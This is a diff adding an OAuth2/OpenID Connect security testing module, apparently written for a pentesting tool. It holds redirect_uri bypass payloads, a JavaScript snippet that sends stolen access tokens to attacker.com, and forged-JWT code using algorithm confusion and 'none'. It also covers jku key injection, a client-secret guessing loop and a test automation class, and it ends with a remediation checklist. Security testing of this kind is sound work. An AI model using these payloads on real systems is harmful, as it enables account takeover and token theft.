@@ -1,0 +1,339 @@
+{# OAuth2/OpenID Connect Security Testing Module #}
+{# Comprehensive OAuth/OIDC vulnerability discovery and exploitation #}
+
+<oauth_oidc_security_module>
+
+## OAUTH2 & OPENID CONNECT SECURITY TESTING GUIDE
+
+### RECONNAISSANCE
+
+**OAuth Endpoint Discovery:**
+```
+/.well-known/openid-configuration
+/.well-known/oauth-authorization-server
+/oauth/authorize
+/oauth/token
+/oauth2/authorize
+/oauth2/token
+/authorize
+/token
+/auth
+/login/oauth
+/api/oauth
+```
+
+**OIDC Discovery Response Analysis:**
+```json
+{
+  "issuer": "https://auth.target.com",
+  "authorization_endpoint": "https://auth.target.com/authorize",
+  "token_endpoint": "https://auth.target.com/token",
+  "userinfo_endpoint": "https://auth.target.com/userinfo",
+  "jwks_uri": "https://auth.target.com/.well-known/jwks.json",
+  "scopes_supported": ["openid", "profile", "email", "admin"],
+  "response_types_supported": ["code", "token", "id_token"],
+  "grant_types_supported": ["authorization_code", "implicit", "client_credentials"]
+}
+```
+
+### REDIRECT_URI MANIPULATION
+
+**Open Redirect Attacks:**
+```
+# Basic bypass attempts
+?redirect_uri=https://attacker.com
+?redirect_uri=https://target.com.attacker.com
+?redirect_uri=https://attacker.com/target.com
+?redirect_uri=https://target.com@attacker.com
+?redirect_uri=https://target.com%40attacker.com
+
+# Path manipulation
+?redirect_uri=https://target.com/callback/../../../attacker
+?redirect_uri=https://target.com/callback/..%2f..%2f..%2fattacker
+?redirect_uri=https://target.com/callback;attacker.com
+?redirect_uri=https://target.com/callback?next=https://attacker.com
+
+# Subdomain attacks
+?redirect_uri=https://evil.target.com
+?redirect_uri=https://callback.target.com.evil.com
+?redirect_uri=https://targetcom.evil.com
+
+# Protocol manipulation
+?redirect_uri=http://target.com/callback  # HTTP downgrade
+?redirect_uri=javascript:alert(1)
+?redirect_uri=data:text/html,<script>alert(1)</script>
+
+# Unicode/encoding bypasses
+?redirect_uri=https://target。com  # Homograph
+?redirect_uri=https://target%E3%80%82com
+?redirect_uri=https://target.com%00.attacker.com
+```
+
+### AUTHORIZATION CODE ATTACKS
+
+**Code Interception:**
+```
+# Steal code via open redirect
+https://auth.target.com/authorize?
+  client_id=CLIENT&
+  redirect_uri=https://target.com/callback/../../../attacker.com&
+  response_type=code&
+  scope=openid
+```
+
+**Code Reuse Attack:**
+```python
+# Test if authorization codes can be reused
+code = "INTERCEPTED_CODE"
+for _ in range(5):
+    response = requests.post(token_url, data={
+        "grant_type": "authorization_code",
+        "code": code,
+        "client_id": "...",
+        "redirect_uri": "..."
+    })
+    print(response.json())  # Should fail after first use
+```
+
+**Code Injection:**
+```
+# Inject code from different flow
+?code=STOLEN_CODE_FROM_VICTIM
+```
+
+### CSRF/STATE PARAMETER ATTACKS
+
+**Missing State Parameter:**
+```
+# Request without state - vulnerable to CSRF
+https://auth.target.com/authorize?
+  client_id=CLIENT&
+  redirect_uri=https://target.com/callback&
+  response_type=code&
+  scope=openid
+# No state parameter = CSRF possible
+```
+
+**State Fixation:**
+```html
+<!-- Attacker sets known state value -->
+<a href="https://auth.target.com/authorize?
+  client_id=CLIENT&
+  redirect_uri=https://target.com/callback&
+  response_type=code&
+  state=ATTACKER_CONTROLLED_STATE">Login</a>
+```
+
+**State Confusion:**
+```
+# Login CSRF - force victim to login as attacker
+1. Attacker initiates OAuth flow, gets code
+2. Attacker sends victim link with attacker's code
+3. Victim's session linked to attacker's account
+```
+
+### TOKEN ATTACKS
+
+**Token Leakage via Implicit Flow:**
+```
+# Token in URL fragment - exposed in:
+# - Browser history
+# - Referer headers
+# - Logs
+
+https://target.com/callback#access_token=LEAKED_TOKEN&token_type=bearer
+```
+
+**Token Theft via XSS:**
+```javascript
+// Steal token from fragment
+var token = window.location.hash.match(/access_token=([^&]*)/)[1];
+fetch('https://attacker.com/steal?token=' + token);
+```
+
+**Token Reuse/Replay:**
+```python
+# Test token validity across different clients
+stolen_token = "VICTIM_ACCESS_TOKEN"
+response = requests.get(
+    "https://api.target.com/userinfo",
+    headers={"Authorization": f"Bearer {stolen_token}"}
+)
+```
+
+### CLIENT CREDENTIAL ATTACKS
+
+**Client Secret Exposure:**
+```
+# Check for exposed secrets in:
+- JavaScript source code
+- Mobile app decompilation
+- API responses
+- Error messages
+- Git repositories
+- .env files
+```
+
+**Weak Client Authentication:**
+```python
+# Test weak client credentials
+common_secrets = ["secret", "password", "123456", CLIENT_ID]
+for secret in common_secrets:
+    response = requests.post(token_url, data={
+        "grant_type": "client_credentials",
+        "client_id": CLIENT_ID,
+        "client_secret": secret
+    })
+    if "access_token" in response.text:
+        print(f"Weak secret found: {secret}")
+```
+
+### SCOPE ESCALATION
+
+**Privilege Escalation via Scope:**
+```
+# Request additional scopes
+?scope=openid profile email admin
+?scope=openid+profile+email+write:all
+?scope=openid%20admin%20delete
+
+# Test for scope upgrade
+Original: scope=read
+Modified: scope=read write admin
+```
+
+**Scope Confusion:**
+```
+# Different scope interpretation between authorization and resource server
+?scope=user:email  # GitHub style
+?scope=email       # Standard OIDC
+?scope=https://target.com/auth/admin  # Custom scope URL
+```
+
+### JWT/ID_TOKEN ATTACKS
+
+**Signature Bypass:**
+```python
+import jwt
+import base64
+
+# Algorithm confusion attack (RS256 -> HS256)
+token = jwt.encode(
+    {"sub": "admin", "iss": "https://target.com"},
+    key=PUBLIC_KEY,  # Use public key as HMAC secret
+    algorithm="HS256"
+)
+
+# None algorithm attack
+header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode()
+payload = base64.b64encode(b'{"sub":"admin"}').decode()
+token = f"{header}.{payload}."
+```
+
+**JWKS Injection:**
+```
+# Host malicious JWKS
+1. Create own RSA keypair
+2. Sign token with private key
+3. Set jku header to attacker-controlled URL
+4. Host public key at that URL
+
+{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
+```
+
+**Claims Manipulation:**
+```json
+// Modify claims
+{"sub": "victim_id", "email": "attacker@example.com"}
+{"sub": "admin", "role": "administrator"}
+{"exp": 9999999999}  // Far future expiration
+{"aud": "different_client"}  // Audience confusion
+```
+
+### PKCE ATTACKS
+
+**PKCE Downgrade:**
+```
+# Test if PKCE is optional
+# Send request without code_verifier
+POST /token
+grant_type=authorization_code&
+code=AUTH_CODE&
+redirect_uri=https://target.com/callback
+# No code_verifier = PKCE not enforced
+```
+
+**Code Challenge Method Confusion:**
+```
+# Test S256 vs plain
+code_verifier=ATTACKER_VERIFIER
+code_challenge=ATTACKER_VERIFIER  # plain method
+code_challenge_method=plain  # Weaker than S256
+```
+
+### ACCOUNT TAKEOVER FLOWS
+
+**Pre-Authentication Account Linking:**
+```
+1. Attacker creates account with victim's email (unverified)
+2. Victim uses OAuth to login with same email
+3. Accounts get merged
+4. Attacker gains access to victim's OAuth-linked account
+```
+
+**OAuth Account Hijacking:**
+```
+1. Attacker initiates OAuth with victim's email on IdP
+2. Victim clicks "confirm" link sent by attacker
+3. Attacker's app linked to victim's IdP account
+4. Attacker can login as victim
+```
+
+### TESTING AUTOMATION
+
+```python
+import requests
+from urllib.parse import urlencode, urlparse
+
+class OAuthTester:
+    def __init__(self, auth_url, token_url, client_id):
+        self.auth_url = auth_url
+        self.token_url = token_url
+        self.client_id = client_id
+    
+    def test_redirect_uri_bypass(self, legitimate_redirect):
+        bypasses = [
+            f"{legitimate_redirect}@attacker.com",
+            f"{legitimate_redirect}/../../../attacker.com",
+            f"https://attacker.com/{urlparse(legitimate_redirect).netloc}",
+            f"{legitimate_redirect}%00.attacker.com",
+        ]
+        
+        for bypass in bypasses:
+            url = f"{self.auth_url}?client_id={self.client_id}&redirect_uri={bypass}&response_type=code"
+            r = requests.get(url, allow_redirects=False)
+            if r.status_code == 302 and "attacker.com" in r.headers.get("Location", ""):
+                print(f"VULNERABLE: {bypass}")
+    
+    def test_state_param(self):
+        # Test without state
+        url = f"{self.auth_url}?client_id={self.client_id}&redirect_uri=https://target.com/cb&response_type=code"
+        r = requests.get(url)
+        if "state" not in r.url:
+            print("WARNING: State parameter not required")
+```
+
+### REMEDIATION CHECKLIST
+
+- [ ] Implement strict redirect_uri validation (exact match)
+- [ ] Require and validate state parameter
+- [ ] Use PKCE with S256 for all flows
+- [ ] Validate all JWT signatures properly
+- [ ] Implement short-lived authorization codes (single use)
+- [ ] Use secure token storage (not localStorage)
+- [ ] Avoid implicit flow - use authorization code with PKCE
+- [ ] Validate token audience (aud claim)
+- [ ] Implement token binding/DPoP
+- [ ] Regular rotation of client secrets
+
+</oauth_oidc_security_module>
